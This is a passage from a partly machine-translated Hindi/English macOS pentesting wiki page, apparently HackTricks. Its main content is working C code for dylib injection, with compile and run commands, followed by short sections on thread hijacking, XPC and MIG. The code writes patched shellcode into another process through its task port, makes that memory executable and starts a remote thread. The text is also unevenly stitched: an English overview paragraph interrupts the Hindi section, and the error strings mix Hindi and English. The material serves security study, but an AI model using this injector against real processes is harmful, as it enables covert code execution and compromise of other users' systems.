fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"दूरस्थ थ्रेड कोड के लिए मेमोरी अनुमतियों को सेट करने में असमर्थ: त्रुटि %s\n", mach_error_string(kr));
return (-4);
}

// आवंटित स्टैक मेमोरी पर अनुमतियाँ सेट करें
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"दूरस्थ थ्रेड के स्टैक के लिए मेमोरी अनुमतियों को सेट करने में असमर्थ: त्रुटि %s\n", mach_error_string(kr));
return (-4);
}


// शेलकोड चलाने के लिए थ्रेड बनाएं
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // यह वास्तविक स्टैक है
//remoteStack64 -= 8;  // 16 की अलाइनमेंट की आवश्यकता है

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("दूरस्थ स्टैक 64  0x%llx, दूरस्थ कोड है %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"दूरस्थ थ्रेड बनाने में असमर्थ: त्रुटि %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "उपयोग: %s _pid_ _क्रिया_\n", argv[0]);
fprintf (stderr, "   _क्रिया_: डिस्क पर एक dylib का पथ\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib नहीं मिली\n");
}

}
```
</details>  

### macOS IPC (Inter-Process Communication)

#### macOS IPC Overview

Inter-process communication (IPC) mechanisms are essential for processes to communicate with each other. macOS provides various IPC mechanisms such as Mach ports, XPC services, and UNIX domain sockets. Understanding how these mechanisms work is crucial for both developers and security researchers.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### थ्रेड हाइजैकिंग के माध्यम से टास्क पोर्ट <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

इस तकनीक में प्रक्रिया का एक थ्रेड हाइजैक किया जाता है:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### मौलिक जानकारी

XPC, जिसका मतलब है XNU (macOS द्वारा उपयोग किया जाने वाला कर्नेल) इंटर-प्रोसेस कम्युनिकेशन, macOS और iOS पर प्रक्रियाओं के बीच **संचार** के लिए एक फ्रेमवर्क है। XPC विभिन्न प्रक्रियाओं के बीच **सुरक्षित, असिंक्रोनस मेथड कॉल्स** करने के लिए एक तंत्र प्रदान करता है। यह Apple की सुरक्षा पैराडाइम का हिस्सा है, जो **विशेषाधिकार विभाजित अनुप्रयोगों** की सृष्टि को संभव बनाता है जहाँ प्रत्येक **घटक** केवल उन अनुमतियों के साथ चलता है जो उसके काम के लिए आवश्यक हैं, इस प्रक्रिया से होने वाली संभावित हानि को सीमित करते हैं।

इस **संचार** के काम करने के बारे में अधिक जानकारी के लिए यहाँ देखें:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - मैक इंटरफेस जेनरेटर

MIG को **मैक IPC** कोड निर्माण की प्रक्रिया को सरल बनाने के लिए बनाया गया था। यह मूल रूप से एक विशिष्ट परिभाषा के साथ सर्वर और क्लाइंट के बीच संवाद के लिए आवश्यक कोड उत्पन्न करता है। यदी उत्पन्न कोड बेहद बदसूरत हो, तो एक डेवलपर को उसे आयात करने की आवश्यकता होगी और उसका कोड पहले की तुलना में बहुत सरल होगा।

अधिक जानकारी के लिए देखें:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## संदर्भ

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
